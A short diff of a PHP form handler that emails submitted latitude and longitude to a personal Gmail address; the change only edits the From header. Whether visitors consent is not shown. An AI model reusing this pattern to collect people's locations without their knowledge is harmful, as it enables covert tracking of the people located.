@@ -7,7 +7,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $to = "testimony1201@gmail.com";
     $subject = "User Location";
     $message = "Latitude: $latitude\nLongitude: $longitude";
-    $headers = "From: webmaster@example.com"; // Change this to your email
+    $headers = "From: testimony1201@gmail.com "; // Change this to your email
 
     // Send email
     if (mail($to, $subject, $message, $headers)) {
